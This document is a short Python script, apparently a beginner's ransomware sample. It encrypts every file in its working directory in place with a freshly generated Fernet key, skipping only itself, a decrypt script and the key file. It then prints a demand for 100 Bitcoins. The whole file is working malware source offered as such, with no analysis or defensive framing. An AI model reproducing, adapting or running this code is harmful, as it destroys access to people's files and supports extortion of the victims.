from cryptography.fernet import Fernet as f
import os

files = []

for file in os.listdir():
	if file == "medo.py" or file == "decrypt.py"  or file == "thekey.key": # to don`t encrypt the malware algorythm or the key
		continue
	if os.path.isfile(file): # to don`t encrypt things that aren`t a file
		files.append(file)


key = f.generate_key() # will generate a key to decrypth your files later

with open("thekey.key", "wb") as thekey: # saves (write) the key into a binary file named thekey.key
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted =  f(key).encrypt(contents) # reads each one of the files
	with open(file, "wb") as thefile:  # write the encrypted content over the original
		thefile.write(contents_encrypted)

print("All of your files has been encrypted! Give me 100 Bitcoins to receive the key to decrypt them all.")
